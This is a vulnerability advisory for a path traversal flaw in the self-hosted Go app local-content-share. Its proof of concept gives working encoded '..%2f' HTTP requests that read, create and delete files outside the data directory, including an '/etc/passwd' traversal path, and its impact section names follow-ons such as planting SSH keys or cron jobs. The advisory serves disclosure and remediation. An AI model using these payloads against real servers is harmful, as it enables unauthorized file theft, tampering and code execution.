# VDR-013: Unauthenticated Path Traversal (read/write/delete) in local-content-share

- **Target**: [Tanq16/local-content-share](https://github.com/Tanq16/local-content-share)
- **Severity**: Critical (CVSS 3.1: 9.8)
- **CWE**: [CWE-22](https://cwe.mitre.org/data/definitions/22.html) - Path Traversal
- **CVE**: [CVE-2026-51096](https://www.cve.org/CVERecord?id=CVE-2026-51096)
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Discovered**: 2026-06-05
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

`local-content-share` is a self-hosted Go web application for sharing text snippets and
files. It is shipped and documented to run **without authentication**. Multiple HTTP
endpoints take a user-controlled path segment from the request URL and pass it directly
into `filepath.Join("data", userInput)` against raw `os.*` filesystem calls, with no
`filepath.Clean` canonicalization, no verification that the resolved path stays inside the
intended `data/` directory, and no access control.

Because Go's `net/http` `ServeMux` URL-decodes `%2f` into a literal `/` inside
`r.URL.Path` (while leaving `RawPath` encoded, so its path-cleaning redirect never fires),
an attacker can submit URL-encoded `..%2f` sequences that reach the handler decoded as
`../`. `filepath.Join` then collapses those `..` segments and the resulting path escapes
the `data/` directory entirely.

This grants an **unauthenticated** remote attacker three distinct primitives against the
host filesystem, bounded only by the OS privileges of the server process:

- **Arbitrary file read** (`/download/`, `/raw/`)
- **Arbitrary file write/create** (`/edit/`)
- **Arbitrary file delete** (`/delete/`)

The flaw is present in the current HEAD (`4b0fae2`, 2026-01-28) and the latest release
tag **v37**, and affects all earlier tags that contain these handlers.

## Affected Component

Single file `main.go`, raw `os.*` calls on `filepath.Join("data", userInput)` with no
containment check and no authentication:

- `main.go:657` - `os.Open(filepath.Join("data", filename))` - **READ**
  (`filename = strings.TrimPrefix(r.URL.Path, "/download/")`, no guard at all)
- `main.go:639` - `os.ReadFile(filepath.Join("data", id))` - **READ**
  (guard `strings.HasPrefix(id, "text/")` at `main.go:635`, bypassable via `text/../`)
- `main.go:788` - `os.WriteFile(filepath.Join("data", id), content, 0644)` - **WRITE/CREATE**
  (guard `strings.HasPrefix(id, "text/")` at `main.go:779`, bypassable via `text/../`)
- `main.go:756` - `os.Remove(filepath.Join("data", id))` - **DELETE** (no traversal guard)
- `main.go:623` - `os.Rename(oldFullPath, newPath)` - **MOVE/RENAME** (no traversal guard;
  both source and destination are attacker-influenced via `filepath.Join("data", oldPath)`)

The `/view/` endpoint (`main.go:707`) uses `http.ServeFile`, which has its own
`containsDotDot` protection, and is therefore **not** affected.

> **Drift note (verified 2026-06-05):** the line numbers above match the audited HEAD
> `4b0fae2` exactly (zero drift). The original dossier referenced "tag v9"; the repository
> has since advanced to **tag v37** (`aaaf267`, 2026-01-28 16:00:48), and HEAD `4b0fae2` is
> the single commit immediately after v37. The advisory is scoped to "through tag v37 / HEAD
> 4b0fae2". The data layout has also evolved into subdirectories (`data/text`,
> `data/notepad`, `data/files`), which is why the `text/` prefix appears in the `/raw/` and
> `/edit/` guards - but the guards remain bypassable.

## Details

### Root cause: `%2f` survives `ServeMux`, `filepath.Join` collapses `..`

Go's `http.ServeMux` (used here via `http.HandleFunc(...)` against the `DefaultServeMux`)
populates `r.URL.Path` with the **percent-decoded** path. An encoded `%2f` therefore
becomes a real `/` in `r.URL.Path`. The ServeMux redirect that would normally "clean" a
dotted path compares against the *escaped* form (`RawPath`/`EscapedPath()`), so a request
whose dirtiness only appears after decoding is **not** redirected and is dispatched
straight to the handler.

Empirically confirmed on Go 1.26.1 / Windows for `GET /download/..%2f..%2fSECRET_OUTSIDE.txt`:

```
RequestURI = "/download/..%2f..%2fSECRET_OUTSIDE.txt"
URL.Path   = "/download/../../SECRET_OUTSIDE.txt"     <-- %2f decoded to literal "/"
URL.RawPath= "/download/..%2f..%2fSECRET_OUTSIDE.txt" <-- stays encoded -> no clean redirect
TrimPrefix = "../../SECRET_OUTSIDE.txt"
filepath.Join("data","../../SECRET_OUTSIDE.txt") = "..\SECRET_OUTSIDE.txt"  <-- escapes data/
```

`filepath.Join` runs `filepath.Clean` internally, which resolves the `..` segments and
walks **out** of `data/`. None of the affected handlers re-validate that the cleaned result
is still rooted under a canonical `data/` directory, so the escape is silent and complete.

### The `text/` prefix-guard bypass (`/raw/`, `/edit/`)

`/raw/` (`main.go:635`) and `/edit/` (`main.go:779`) attempt to restrict access to text
snippets with:

```go
id := strings.TrimPrefix(r.URL.Path, "/raw/")   // or "/edit/"
if !strings.HasPrefix(id, "text/") {
    http.Error(w, "Only text files can be accessed", http.StatusBadRequest)
    return
}
content, err := os.ReadFile(filepath.Join("data", id))
```

This is a string-prefix check performed **before** path normalization. An attacker simply
prefixes the traversal with `text/`:

```
id = "text/../../SECRET_OUTSIDE.txt"
strings.HasPrefix(id, "text/")            == true        // guard passes
filepath.Join("data", "text/../../SECRET_OUTSIDE.txt") == "SECRET_OUTSIDE.txt"
```

The first `..` consumes the `text/` segment and the rest escapes `data/`. Prefix string
matching is not a substitute for canonicalized containment.

### Per-sink trace (current code, HEAD 4b0fae2)

**READ - `/download/` (main.go:649-657, no guard):**
```go
filename := strings.TrimPrefix(r.URL.Path, "/download/")
filePath := filepath.Join("data", filename)
fileInfo, err := os.Stat(filePath)        // :652
...
file, err := os.Open(filePath)            // :657  <-- arbitrary read sink
```

**READ - `/raw/` (main.go:633-639, guard bypassed):**
```go
id := strings.TrimPrefix(r.URL.Path, "/raw/")
if !strings.HasPrefix(id, "text/") { ... } // :635  guard, bypass via text/../
content, err := os.ReadFile(filepath.Join("data", id)) // :639  <-- arbitrary read sink
```

**WRITE/CREATE - `/edit/` (main.go:773-788, guard bypassed, POST):**
```go
id := strings.TrimPrefix(r.URL.Path, "/edit/")
if !strings.HasPrefix(id, "text/") { ... }              // :779 guard, bypass via text/../
content := r.FormValue("content")
err := os.WriteFile(filepath.Join("data", id), []byte(content), 0644) // :788 <-- write sink
```

**DELETE - `/delete/` (main.go:711-756, no traversal guard, POST):**
```go
id := strings.TrimPrefix(r.URL.Path, "/delete/")
// only special-cases a "link/" prefix; otherwise:
err := os.Remove(filepath.Join("data", id))             // :756  <-- delete sink
```

**MOVE - `/rename/` (main.go:604-623, no traversal guard):**
```go
baseDir := filepath.Dir(filepath.Join("data", oldPath))
newPath := filepath.Join(baseDir, newName)
oldFullPath := filepath.Join("data", oldPath)
err := os.Rename(oldFullPath, newPath)                  // :623  <-- move sink
```

### Attack-vector depth (relative to the server's working directory)

`data/` is created under the server's current working directory (`CWD`). Verified resolution:

| Request | `filepath.Join` result | Lands at |
|---|---|---|
| `/download/..%2f..%2f<x>` | `..\<x>` | parent of CWD |
| `/raw/text%2f..%2f..%2f<x>` | `<x>` | CWD (the `text/` is eaten by the first `..`) |
| `/edit/text%2f..%2f..%2f<x>` | `<x>` | CWD |
| `/delete/..%2f<x>` | `<x>` | CWD |

Adding further `..%2f` segments walks arbitrarily far up the tree (e.g.
`..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd` to reach `/etc/passwd` on Linux), so the
escape is not limited to a single level.

## Proof of Concept

A self-contained, end-to-end runner is provided in [`poc/run_poc.sh`](poc/run_poc.sh). It
builds the **real upstream server** from `repo/`, starts it on port **18803**, plants
sentinel files **outside** the `data/` directory, exercises all primitives with `curl
--path-as-is`, and verifies every outcome against the filesystem. Full captured transcript:
[`poc/OUTPUT.txt`](poc/OUTPUT.txt). The exact requests and **real** server responses follow.

### 1) Arbitrary file READ - `/download/` (os.Open, main.go:657)

Request:
```
GET /download/..%2f..%2fSECRET_OUTSIDE.txt HTTP/1.1
Host: 127.0.0.1:18803
```
Real response:
```
HTTP/1.1 200 OK
Content-Disposition: attachment; filename="SECRET_OUTSIDE.txt"
Content-Length: 107
Content-Type: application/octet-stream
X-Content-Type-Options: nosniff

TOP-SECRET-55031 :: read via /download traversal :: line below proves OOB read
flag{lcs_download_oob_read}
```
The returned bytes are the sentinel located **above** `data/` (in the parent of the server
CWD). Server log: `Served ../../SECRET_OUTSIDE.txt for download`.

### 2) Arbitrary file READ - `/raw/` with `text/` guard bypass (os.ReadFile, main.go:639)

Request:
```
GET /raw/text%2f..%2f..%2fSECRET_OUTSIDE.txt HTTP/1.1
Host: 127.0.0.1:18803
```
Real response:
```
HTTP/1.1 200 OK
Cache-Control: no-store
Content-Type: text/plain; charset=utf-8
Content-Length: 102

TOP-SECRET-55031 :: read via /raw text/.. bypass :: line below proves OOB read
flag{lcs_raw_oob_read}
```
`HasPrefix(id, "text/")` returned true, yet the file read resolved outside `data/`.

### 3) Arbitrary file WRITE/CREATE - `/edit/` with `text/` guard bypass (os.WriteFile, main.go:788)

Request:
```
POST /edit/text%2f..%2f..%2fDROPPED.txt HTTP/1.1
Host: 127.0.0.1:18803
Content-Type: application/x-www-form-urlencoded

content=PWNED-by-VDR-006 flag{lcs_edit_oob_write}
```
Real response:
```
HTTP/1.1 303 See Other
Location: /
Content-Length: 0
```
Filesystem proof - `DROPPED.txt` did **not** exist before the request and was created
**outside** `data/` (at CWD) with full attacker-controlled content:
```
[PRE ] DROPPED.txt exists? no
[POST] DROPPED.txt exists? YES
contents: PWNED-by-VDR-006 flag{lcs_edit_oob_write}
```
Server log: `Edited text/../../DROPPED.txt`.

### 4) Arbitrary file DELETE - `/delete/` (os.Remove, main.go:756)

Request:
```
POST /delete/..%2fVICTIM.txt HTTP/1.1
Host: 127.0.0.1:18803
```
Real response:
```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 16

{"status": "ok"}
```
Filesystem proof - the victim file located **outside** `data/` was removed:
```
[PRE ] VICTIM.txt exists? YES
[POST] VICTIM.txt exists? no
```
Server log: `Deleted ../VICTIM.txt`.

### Authentication control

Every request above was sent with **no cookies, no tokens, and no authentication headers**.
A baseline `GET /` likewise returns `HTTP 200` without credentials, confirming the service
exposes these primitives entirely unauthenticated.

## Impact

An unauthenticated, network-adjacent attacker who can reach the HTTP port obtains, with the
privileges of the server process:

- **Confidentiality (C:H)** - read of arbitrary host files the process can access:
  application secrets and config, TLS private keys, `/etc/passwd`, source code, SSH private
  keys, `.env` files, database files, etc.
- **Integrity (I:H)** - create or overwrite arbitrary files. This is directly
  **RCE-adjacent**: writing `~/.ssh/authorized_keys` (when the process runs as a user with
  an SSH login), dropping a cron job (`/etc/cron.d/*` or a user crontab spool), planting a
  systemd unit, or overwriting a script/binary later executed by the host yields code
  execution. Arbitrary delete additionally enables targeted tampering.
- **Availability (A:H)** - delete arbitrary reachable files (including the application's own
  `data/` store and the host config it can touch), causing data destruction and denial of
  service.

These align to CWE-22 and the vector `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
(Base **9.8, Critical**). The project's documented "no authentication" posture covers
sharing content **inside** `data/`; it does **not** sanction read/write/delete of arbitrary
host files **outside** that directory. The directory-boundary break is a separate,
reportable security defect independent of the authentication design choice.

A self-hosted instance is frequently placed behind a reverse proxy and exposed to a LAN or
the internet, so the network attack surface is realistic.

## Recommendation

1. **Canonicalize and contain every path.** After building the candidate path, resolve it
   to an absolute, symlink-free form and verify it is still rooted under the canonical
   `data/` directory before any `os.*` call. Pattern:

   ```go
   root, _ := filepath.Abs("data")
   p := filepath.Join(root, filepath.Clean("/"+userInput)) // clean against a rooted prefix
   abs, err := filepath.Abs(p)
   if err != nil || (abs != root && !strings.HasPrefix(abs, root+string(os.PathSeparator))) {
       http.Error(w, "invalid path", http.StatusBadRequest)
       return
   }
   // Go 1.24+: prefer os.Root / (*os.Root).Open|Create|Remove to enforce containment at the syscall layer.
   ```

   Cleaning the input against a rooted prefix (`filepath.Clean("/" + userInput)`) neutralizes
   leading `..` segments so they cannot escape; the explicit `HasPrefix` re-check defends
   against edge cases and symlinks.

2. **Reject traversal outright.** Decode the path, then reject any request whose path
   contains a `..` segment or a decoded path separator in the user-controlled portion, before
   dispatch.

3. **Replace prefix string guards with containment checks.** The `strings.HasPrefix(id,
   "text/")` checks in `/raw/` and `/edit/` must validate the *resolved* path, not the raw
   prefix string.

4. **Add authentication / authorization** for state-changing endpoints (`/edit/`,
   `/delete/`, `/rename/`) at minimum, and ideally for reads, so that filesystem-touching
   operations are not anonymous.

5. **Run with least privilege** (dedicated low-privilege user, read-only host mounts where
   possible, container with no host bind beyond `data/`) to limit blast radius.

## Status

| Date | Event |
|------|-------|
| 2026-06-05 | Vulnerability discovered during source code audit |
| 2026-06-05 | Working PoC confirmed (read/write/delete) |
| TBD | CVE request submitted to MITRE CNA-LR |

## References

- [CWE-22](https://cwe.mitre.org/data/definitions/22.html)
- [Upstream repository](https://github.com/Tanq16/local-content-share)
